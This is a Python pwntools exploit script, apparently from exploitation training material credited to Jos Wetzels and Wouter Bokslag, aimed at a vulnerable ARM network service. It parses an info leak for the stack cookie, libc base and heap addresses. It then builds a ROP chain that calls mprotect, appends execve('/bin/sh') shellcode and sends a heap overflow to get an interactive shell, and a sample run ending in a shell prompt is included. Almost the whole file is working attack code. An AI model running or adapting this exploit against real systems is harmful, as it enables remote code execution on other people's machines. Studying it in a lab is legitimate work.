#!/usr/bin/env python

"""
************************************
* Extended Exploitation Test (EET) *
************************************
(c) Jos Wetzels, Wouter Bokslag

root@debian:~/ut/eet# python heap_bof_exploit.py 
[+] Opening connection to 192.168.0.102 on port 1340: Done
[+] Got stackpointer: [beef3cd0]
[+] Got stack cookie: [b1fa1100]
[+] Got libc base: [b6e09000]
[+] Got heap pointer: [1ec8008]
[*] Building ROP chain...
[*] Sending exploit payload...
[*] Switching to interactive mode
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi)
"""

import sys
import re
from pwn import *
from struct import pack
from gadgets import arm_gadgets

def do_exploit(h, libc_version, libc_base, heap_pointer):
	print "[*] Building ROP chain..."

	# Linux/ARM, execve(r0, 0, 0)
	shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x49\x1a\x92\x1a\x0b\x27\x01\xdf\xc0\x46"

	# Overflow size
	overflow_size = 4588

	# Binary base
	bin_base = 0

	# Offsets from binary and libc base to ROP chain elements
	mprotect_offset = arm_gadgets['libc'][libc_version]['mprotect']
	binsh_offset = arm_gadgets['libc'][libc_version]['binsh']
	pivot_offset = 0x00010804 	# sp = r0; pop {pc}
	arg_offset = 0x00010834 	# pop {r0, r1, r2, r3, lr}; bx r3

	# Determine ROP Chain element addresses
	PIVOT_gadget = bin_base + pivot_offset 			# pivot gadget
	ARG_gadget = bin_base + arg_offset    			# arg setting gadget
	MPROTECT_addr = libc_base + mprotect_offset     # mprotect address
	BINSH_addr = libc_base + binsh_offset       	# @"/bin/sh\x00"
	shellcode_addr = (heap_pointer + 11*4) 			# shellcode comes after ROP chain in our heap object
	junk = 0x0BADC0DE

	rop_chain = "".join([pack('<I', x) for x in [ARG_gadget, (shellcode_addr & 0xfffff000), 0xfff, 7, MPROTECT_addr, ARG_gadget, BINSH_addr, junk, junk, shellcode_addr, junk]])

	databuffer = rop_chain + shellcode + "A"*(overflow_size - len(rop_chain) - len(shellcode)) + pack('<I', PIVOT_gadget)

	print "[*] Sending exploit payload..."

	h.send(databuffer)

	h.interactive()
	return

def grab_infoleak(msg):
	stack_pointer, stack_cookie = [long(x, 16) for x in re.findall('\[(.*?)\.(.*?)\]', msg.split("\n")[0], re.I)[0]]
	libc_base = long(re.findall('libc.so.6\]\@\[(.*?)\]', msg, re.M|re.I)[0], 16)
	heap_pointer = long(re.findall('^\[(0x.*?)\]$', msg, re.M|re.I)[0], 16)

	return stack_pointer, stack_cookie, libc_base, heap_pointer

host = '192.168.0.102'
port = 1340
libc_version = '2.19'

h = remote(host, port, timeout = None)

msg = h.recvuntil('> ')
stack_pointer, stack_cookie, libc_base, heap_pointer = grab_infoleak(msg)

print "[+] Got stackpointer: [%x]" % stack_pointer
print "[+] Got stack cookie: [%x]" % stack_cookie
print "[+] Got libc base: [%x]" % libc_base
print "[+] Got heap pointer: [%x]" % heap_pointer

do_exploit(h, libc_version, libc_base, heap_pointer)